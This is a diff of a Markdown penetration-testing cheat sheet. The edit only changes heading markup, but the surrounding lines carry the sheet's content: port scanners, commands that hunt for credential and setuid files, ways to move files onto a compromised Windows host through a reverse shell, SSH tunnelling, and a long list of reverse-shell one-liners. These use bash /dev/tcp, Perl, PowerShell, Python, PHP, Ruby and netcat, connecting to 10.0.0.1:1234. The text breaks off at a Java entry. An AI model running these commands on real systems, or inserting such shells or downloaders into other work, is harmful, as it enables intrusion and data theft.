@@ -38,7 +38,7 @@ Host: <strong>&lt;target IP/FQDN&gt;</strong>
 User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)</p></td>
 ```
 
-<span id="anchor-8"></span>Get Full Page Content (telnet, nc)
+#### <span id="anchor-8"></span>Get Full Page Content (telnet, nc)
 
 ```
 nc -v <strong>&lt;target IP/FQDN&gt; &lt;target port&gt;</strong>
@@ -48,21 +48,19 @@ Host: <strong>&lt;target IP/FQDN&gt;</strong>
 User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)</p></td>
 ```
 
-<span id="anchor-9"></span>
-
-<span id="anchor-10"></span>Use Curl to Get HTTP OPTIONS Response
+#### <span id="anchor-10"></span>Use Curl to Get HTTP OPTIONS Response
 
 ```
 curl -I -X OPTIONS **&lt;target IP/FQDN&gt;**
 ```
 
-<span id="anchor-11"></span>Use Curl to Get HTTP HEAD Response
+#### <span id="anchor-11"></span>Use Curl to Get HTTP HEAD Response
 
 ```
 curl -I -X HEAD **&lt;target IP/FQDN&gt;**
 ```
 
-<span id="anchor-12"></span>Use Invoke-WebRequest to Get HTTP OPTIONS
+#### <span id="anchor-12"></span>Use Invoke-WebRequest to Get HTTP OPTIONS
 Response
 
 ```
@@ -70,15 +68,14 @@ Response
 $(Invoke-WebRequest -URI <strong>&lt;target IP/FQDN&gt;</strong> -Method OPTIONS).RawContent</p></td>
 ```
 
-<span id="anchor-13"></span>Use Invoke-WebRequest to Get HTTP HEAD
-Response
+#### <span id="anchor-13"></span>Use Invoke-WebRequest to Get HTTP HEAD Response
 
 ```
 [Net.ServicePointManager]::SecurityProtocol = "tls12, tls11, tls, Ssl3"
 $(Invoke-WebRequest -URI <strong>&lt;target IP/FQDN&gt;</strong> -Method HEAD).RawContent</p></td>
 ```
 
-<span id="anchor-14"></span>Privilege Escalation
+### <span id="anchor-14"></span>Privilege Escalation
 
 Some basic notes/thoughts on gaining privilege escalation:
 
@@ -102,7 +99,7 @@ Some basic notes/thoughts on gaining privilege escalation:
     -   Locate services or other programs that attempt to load missing
         > DLLs or this could be combined with a path order error.
 
-<span id="anchor-15"></span>IKEEXT Service Missing DLL Privileged
+#### <span id="anchor-15"></span>IKEEXT Service Missing DLL Privileged
 Execution
 
 1.  Look for a path that in the %PATH% variable that your user is able
@@ -115,11 +112,11 @@ Execution
 4.  Wait for a restart or trigger a restart of the IKEET service
     somehow.
 
-<span id="anchor-16"></span>Scanning
+### <span id="anchor-16"></span>Scanning
 
-<span id="anchor-17"></span>NMap
+#### <span id="anchor-17"></span>NMap
 
-<span id="anchor-18"></span>Host Scan
+#### <span id="anchor-18"></span>Host Scan
 
 Scans systems and reports a list of hosts that it finds up.
 
@@ -127,7 +124,7 @@ Scans systems and reports a list of hosts that it finds up.
 nmap -sP 172.28.128.0/24
 ```
 
-<span id="anchor-19"></span>Basic TCP Scan
+#### <span id="anchor-19"></span>Basic TCP Scan
 
 Scan ports 1 through 65535 with timing set to 5, OS detection On,
 Verbos, and TCP connect.
@@ -136,7 +133,7 @@ Verbos, and TCP connect.
 nmap -p 1-65535 -T5 -A -v -sT 192.168.57.101
 ```
 
-<span id="anchor-20"></span>Less Noisy SYN Scan
+#### <span id="anchor-20"></span>Less Noisy SYN Scan
 
 Scan ports 1 through 1024 with timing set to 0, OS detection On, Verbos,
 and SYN Only.
@@ -145,7 +142,7 @@ and SYN Only.
 nmap -p 1-1024 -T0 -A -v -sS 192.168.57.101
 ```
 
-<span id="anchor-21"></span>Scan a Service for Vulnerabilities Using NSE
+#### <span id="anchor-21"></span>Scan a Service for Vulnerabilities Using NSE
 
 Scan the hosts contained in the file for vulnerabilities that match the
 given ls filter.
@@ -154,7 +151,7 @@ given ls filter.
 for vuln in $(ls /usr/share/nmap/scripts/**&lt;filename mask&gt;**\*); do nmap -p 80 --open -iL **&lt;hostfile&gt;** --script $vuln &gt;&gt; **&lt;outputfile&gt;**; done
 ```
 
-<span id="anchor-22"></span>Quick ‘n Dirty Bash Ping Sweep
+#### <span id="anchor-22"></span>Quick ‘n Dirty Bash Ping Sweep
 
 Scan the entire 10.11.1/24 network
 
@@ -167,7 +164,7 @@ for ((ip = 0; ip &lt;= 254; ip++));
 done</td>
 ```
 
-<span id="anchor-23"></span>Python Ping Sweep with Multi-Threading
+#### <span id="anchor-23"></span>Python Ping Sweep with Multi-Threading
 (Linux)
 
 Scan the entire 10.11.1/24 network
@@ -206,7 +203,7 @@ pool.close()
 pool.join()</td>
 ```
 
-<span id="anchor-24"></span>Python Ping Sweep with Multi-Threading
+#### <span id="anchor-24"></span>Python Ping Sweep with Multi-Threading
 (Windows)
 
 ```
@@ -235,7 +232,7 @@ pool.close()
 pool.join()</p></td>
 ```
 
-<span id="anchor-25"></span>Python Port Scan
+#### <span id="anchor-25"></span>Python Port Scan
 
 ```
 #!/usr/bin/env python
@@ -293,7 +290,7 @@ total = t2 - t1
 print 'Scanning Completed in: ', total</td>
 ```
 
-<span id="anchor-26"></span>Python Port Scanner (Multi-Threaded)
+#### <span id="anchor-26"></span>Python Port Scanner (Multi-Threaded)
 
 ```
 #!/usr/bin/env python
@@ -352,25 +349,25 @@ total = t2 - t1
 print 'Scanning Completed in: ', total</p></td>
 ```
 
-<span id="anchor-27"></span>PowerShell Port Scan
+#### <span id="anchor-27"></span>PowerShell Port Scan
 
 ```
 1..1024 \| % { echo ((New-Object Net.Sockets.TcpClient).Connect("**&lt;ip address&gt;**", $\_)) "$\_ is open" } 2&gt;Out-Null
 ```
 
-<span id="anchor-28"></span>GoBuster (Web Common Folder Scan)
+#### <span id="anchor-28"></span>GoBuster (Web Common Folder Scan)
 
 ```
 gobuster -u **&lt;url&gt;** -w /usr/share/seclists/Discovery/Web\_Content/common.txt -s '200,204,301,302,307,403,500' -e
 ```
 
-<span id="anchor-29"></span>GoBuster (Web Common CGI Scan)
+#### <span id="anchor-29"></span>GoBuster (Web Common CGI Scan)
 
 ```
 gobuster -u **&lt;url&gt;** -w /usr/share/seclists/Discovery/Web\_Content/cgis.txt -s '200,204,301,302,307,403,500' -e
 ```
 
-<span id="anchor-30"></span>Pivoting
+### <span id="anchor-30"></span>Pivoting
 
 <span id="anchor-31"></span>SSH Reverse Proxy
 
@@ -381,9 +378,9 @@ From local system:
 ssh -D 8181 <strong>&lt;remote_user&gt;</strong>@localhost -p 8888</p></td>
 ```
 
-<span id="anchor-32"></span>Ncat Fu
+### <span id="anchor-32"></span>Ncat Fu
 
-<span id="anchor-33"></span>Send Connection/Banner Grab
+#### <span id="anchor-33"></span>Send Connection/Banner Grab
 
 Grab the banner from the specified SMTP server
 
@@ -391,96 +388,96 @@ Grab the banner from the specified SMTP server
 ncat -nv &lt;ip address&gt; &lt;port&gt;
 ```
 
-<span id="anchor-34"></span>Files
+### <span id="anchor-34"></span>Files
 
-<span id="anchor-35"></span>Locating Files
+#### <span id="anchor-35"></span>Locating Files
 
-<span id="anchor-36"></span>Locate files with setuid bits (\*nix)
+#### <span id="anchor-36"></span>Locate files with setuid bits (\*nix)
 
 ```
 find / -perm 4000 -o perm 2000 -exec ls -ldb {} \\;
 ```
 
-<span id="anchor-37"></span>Locate files belonging to a user (\*nix)
+#### <span id="anchor-37"></span>Locate files belonging to a user (\*nix)
 
-<span id="anchor-38"></span>Version 1
+##### <span id="anchor-38"></span>Version 1
 
 ```
 find -u &lt;username&gt; 2&gt; /dev/null
 ```
 
-<span id="anchor-39"></span>Version 2
+##### <span id="anchor-39"></span>Version 2
 
 ```
 find -user &lt;username&gt; 2&gt; /dev/null
 ```
 
-<span id="anchor-40"></span>Locate files belonging to a group (\*nix)
+#### <span id="anchor-40"></span>Locate files belonging to a group (\*nix)
 
-<span id="anchor-41"></span>Version 1
+##### <span id="anchor-41"></span>Version 1
 
 ```
 find -g &lt;groupname&gt; 2&gt; /dev/null
 ```
 
-<span id="anchor-42"></span>Version 2
+##### <span id="anchor-42"></span>Version 2
 
 ```
 find -group &lt;groupname&gt; 2&gt; /dev/null
 ```
 
-<span id="anchor-43"></span>Locate files that are world writable (\*nix)
+#### <span id="anchor-43"></span>Locate files that are world writable (\*nix)
 
 ```
 find / -perm -2 ! -type l -ls -xdev 2&gt;/dev/null
 ```
 
-<span id="anchor-44"></span>Locate Files with Weak Permissions (Windows)
+#### <span id="anchor-44"></span>Locate Files with Weak Permissions (Windows)
 
 See [*accesschk.exe*](#_z7kt47j1y476) section
 
-<span id="anchor-45"></span>Locate Credential Files (Windows)
+#### <span id="anchor-45"></span>Locate Credential Files (Windows)
 
 ```
 dir /S **\[\*pass\*\|\*cred\*\|\*vnc\*\|\*.config\*\]**
 ```
 
-<span id="anchor-46"></span>Locate Files Containing &lt;String&gt;
+#### <span id="anchor-46"></span>Locate Files Containing &lt;String&gt;
 
 ```
 findstr /SI **&lt;string&gt;** **\[\*.xml\|\*.ini\|\*.txt\]**
 ```
 
-<span id="anchor-47"></span>Locate Files & Folders Accessible to Root
+#### <span id="anchor-47"></span>Locate Files & Folders Accessible to Root
 Only
 
 ```
 find **&lt;path&gt;** -user root -perm +400 ! -perm +044 -print
 ```
 
-<span id="anchor-48"></span>Transfer Files
+### <span id="anchor-48"></span>Transfer Files
 
-<span id="anchor-49"></span>Transfer Files Using NetCat (nc)
+#### <span id="anchor-49"></span>Transfer Files Using NetCat (nc)
 
-<span id="anchor-50"></span>Receiving
+#### <span id="anchor-50"></span>Receiving
 
 ```
 nc -l -p **&lt;port&gt;** &gt; **&lt;filename&gt;**
 ```
 
-<span id="anchor-51"></span>Sending
+#### <span id="anchor-51"></span>Sending
 
 ```
 nc **&lt;address&gt;** **&lt;port&gt;** &lt; **&lt;filename&gt;**
 ```
 
-<span id="anchor-52"></span>TFTP (from reverse Windows shell)
+#### <span id="anchor-52"></span>TFTP (from reverse Windows shell)
 
 ```
 tftp **&lt;ipaddress&gt;** GET **&lt;filename&gt;**
 ```
 
-<span id="anchor-53"></span>FTP (from reverse Windows shell)
+#### <span id="anchor-53"></span>FTP (from reverse Windows shell)
 
 ```
 echo open <strong>&lt;ipaddress&gt;</strong> 21&gt; ftp.txt
@@ -493,7 +490,7 @@ echo bye &gt;&gt; ftp.txt
 ftp –v -n -s:ftp.txt</p></td>
 ```
 
-<span id="anchor-54"></span>VBScript (from reverse Windows shell)
+#### <span id="anchor-54"></span>VBScript (from reverse Windows shell)
 
 Usage: cscript http://**&lt;ipaddress&gt;**/**&lt;file&gt;**
 **&lt;localfilename&gt;**
@@ -526,8 +523,7 @@ echo Next &gt;&gt; wget.vbs
 echo ts.Close &gt;&gt; wget.vbs</td>
 ```
 
-<span id="anchor-55"></span>Invoke-WebRequest (from reverse Windows
-shell)
+#### <span id="anchor-55"></span>Invoke-WebRequest (from reverse Windows shell)
 
 Requires PowerShell v3.0 or higher. Relies on IE. May not work on
 Windows Server.
@@ -536,7 +532,7 @@ Windows Server.
 PS C:\\&gt; Invoke-WebRequest -Uri **&lt;URI&gt;** -OutFile **&lt;dest\_filename&gt;** -UserAgent **&lt;useragentstring&gt;**
 ```
 
-<span id="anchor-56"></span>PowerShell System.Net.WebClient (from
+#### <span id="anchor-56"></span>PowerShell System.Net.WebClient (from
 reverse Windows shell)
 
 **NOTE:** Use only valid URLs and File Names or you will hang the shell.
@@ -548,7 +544,7 @@ echo $webclient = New-Object System.Net.WebClient &gt;&gt;wget.ps1
 echo $webclient.DownloadFile($url,$file) &gt;&gt;wget.ps1</td>
 ```
 
-<span id="anchor-57"></span>PowerShell BITS Transfer (from reverse
+#### <span id="anchor-57"></span>PowerShell BITS Transfer (from reverse
 Windows shell)
 
 **NOTE:** Use only valid URLs and File Names or you will hang the shell.
@@ -563,7 +559,7 @@ echo Import-Module BitsTransfer &gt;&gt; bitsget.ps1
 echo Start-BitsTransfer -Source $url -Destination $file &gt;&gt; bitsget.ps1</p></td>
 ```
 
-<span id="anchor-58"></span>Python Download Echo Script (Windows)
+#### <span id="anchor-58"></span>Python Download Echo Script (Windows)
 
 ```
 echo import urllib &gt; download.py
@@ -571,7 +567,7 @@ echo testfile = urllib.URLopener() &gt;&gt; download.py
 echo testfile.retrieve('<strong>&lt;url_with_file&gt;</strong>', '<strong>&lt;file_name_to_save&gt;</strong>') &gt;&gt; download.py</td>
 ```
 
-<span id="anchor-59"></span>Debug (from reverse Windows shell)
+#### <span id="anchor-59"></span>Debug (from reverse Windows shell)
 
 This method has size limitations. It will only work with 64k or smaller
 files.
@@ -584,13 +580,13 @@ wine exe2bat.exe <strong>&lt;originalPE&gt;</strong> <strong>&lt;destination&gt;
 # Copy and paste the contents of the destination file to your reverse shell</p></td>
 ```
 
-<span id="anchor-60"></span>Copy Command (Share Access)
+#### <span id="anchor-60"></span>Copy Command (Share Access)
 
 ```
 copy \\\\**&lt;source&gt;** **&lt;destination&gt;**
 ```
 
-<span id="anchor-61"></span>Echo Command (Share Access)
+#### <span id="anchor-61"></span>Echo Command (Share Access)
 
 ```
 echo “**&lt;base64 encoded data&gt;**” &gt;&gt; **&lt;destination&gt;**
@@ -600,7 +596,7 @@ echo “**&lt;base64 encoded data&gt;**” &gt;&gt; **&lt;destination&gt;**
 that can be echoed to the remote system. It can then be decoded using
 the **certutil.exe** command.
 
-<span id="anchor-62"></span>PHP Remote Include FTP Download Script
+#### <span id="anchor-62"></span>PHP Remote Include FTP Download Script
 
 ```
 &lt;?php
@@ -624,11 +620,11 @@ the **certutil.exe** command.
 ?&gt;</p></td>
 ```
 
-<span id="anchor-63"></span>Tunneling
+### <span id="anchor-63"></span>Tunneling
 
-<span id="anchor-64"></span>SSH Tunnels
+#### <span id="anchor-64"></span>SSH Tunnels
 
-<span id="anchor-65"></span>SSH Remote Port Forwarding
+##### <span id="anchor-65"></span>SSH Remote Port Forwarding
 
 ```
 ssh **&lt;gateway&gt;** -R **&lt;remote port to bind&gt;**:**&lt;local host&gt;**:**&lt;local port&gt;**
@@ -650,7 +646,7 @@ system. You are connecting back to your working machine. 127.0.0.1:3390
 on your working machine is now connected to port 3389 on the compromised
 system.
 
-<span id="anchor-66"></span>SSH Local Port Forwarding
+##### <span id="anchor-66"></span>SSH Local Port Forwarding
 
 ```
 ssh **&lt;gateway&gt;** -L **&lt;local port to listen&gt;**:**&lt;remote host&gt;**:**&lt;remote port&gt;**
@@ -671,92 +667,92 @@ In the above example, this command is being run from the compromised
 system. You are attempting to forward traffic on the compromised system
 from 127.0.0.1:8080 to the remote web server hosted on 11.11.11.11:80.
 
-<span id="anchor-67"></span>Reverse Shells
+### <span id="anchor-67"></span>Reverse Shells
 
 [*http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet*](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
 
-<span id="anchor-68"></span>One-Liners
+#### <span id="anchor-68"></span>One-Liners
 
 Try substituting “cmd.exe” instead of “/bin/sh” or “/bin/bash” to make
 these work in Windows.
 
 Try the following command separators: ;, &&, \|, \|\|
 
-<span id="anchor-69"></span>Bash v1
+##### <span id="anchor-69"></span>Bash v1
 
 ```
 bash -i &gt;& /dev/tcp/10.0.0.1/8080 0&gt;&1
 ```
 
-<span id="anchor-70"></span>Bash v1.5
+##### <span id="anchor-70"></span>Bash v1.5
 
 ```
 bash -c 'bash -i &gt;& /dev/tcp/&lt;ip&gt;/&lt;port&gt; 0&gt;&1'
 ```
 
-<span id="anchor-71"></span>Bash v2
+##### <span id="anchor-71"></span>Bash v2
 
 ```
 bash -c 'exec 5&lt;&gt;/dev/tcp/&lt;ip&gt;/&lt;port&gt;; while read line 0&lt;&5; do $line 2&gt;&5 &gt;&5; done'
 ```
 
-<span id="anchor-72"></span>Bash v3
+##### <span id="anchor-72"></span>Bash v3
 
 ```
 bash -c 'exec 5&lt;&gt;/dev/tcp/&lt;ip&gt;/&lt;port&gt;; cat &lt;&5 \| while read line; do $line 2&gt;&5 &gt;&5; done'
 ```
 
-<span id="anchor-73"></span>URL Encoded
+##### <span id="anchor-73"></span>URL Encoded
 
 ```
 bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F**&lt;address&gt;**%2F**&lt;port&gt;**%200%3E%261%27
 ```
 
-<span id="anchor-74"></span>Perl
+##### <span id="anchor-74"></span>Perl
 
 ```
 perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF\_INET,SOCK\_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr\_in($p,inet\_aton($i)))){open(STDIN,"&gt;&S");open(STDOUT,"&gt;&S");open(STDERR,"&gt;&S");exec("/bin/sh -i");};'
 ```
 
-<span id="anchor-75"></span>PowerShell
+##### <span id="anchor-75"></span>PowerShell
 
 ```
 $client = New-Object System.Net.Sockets.TCPClient('**&lt;IP\_Address&gt;**',**&lt;port&gt;**);$stream = $client.GetStream();\[byte\[\]\]$bytes = 0..65535\|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&1 \| Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '&gt; ';$sendbyte = (\[text.encoding\]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};
 ```
 
-<span id="anchor-76"></span>Python
+##### <span id="anchor-76"></span>Python
 
 ```
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF\_INET,socket.SOCK\_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(\["/bin/sh","-i"\]);'
 ```
 
-<span id="anchor-77"></span>PHP
+##### <span id="anchor-77"></span>PHP
 
 ```
 php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i &lt;&3 &gt;&3 2&gt;&3");'
 ```
 
-<span id="anchor-78"></span>Ruby
+##### <span id="anchor-78"></span>Ruby
 
 ```
 ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to\_i;exec sprintf("/bin/sh -i &lt;&%d &gt;&%d 2&gt;&%d",f,f,f)'
 ```
 
-<span id="anchor-79"></span>Netcat
+##### <span id="anchor-79"></span>Netcat
 
-<span id="anchor-80"></span>Version 1
+###### <span id="anchor-80"></span>Version 1
 
 ```
 nc -e /bin/sh 10.0.0.1 1234
 ```
 
-<span id="anchor-81"></span>Version 2
+###### <span id="anchor-81"></span>Version 2
 
 ```
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\|/bin/sh -i 2&gt;&1\|nc 10.0.0.1 1234 &gt;/tmp/f
 ```
 
-<span id="anchor-82"></span>Java
+##### <span id="anchor-82"></span>Java
 
 ```
 r = Runtime.getRuntime()
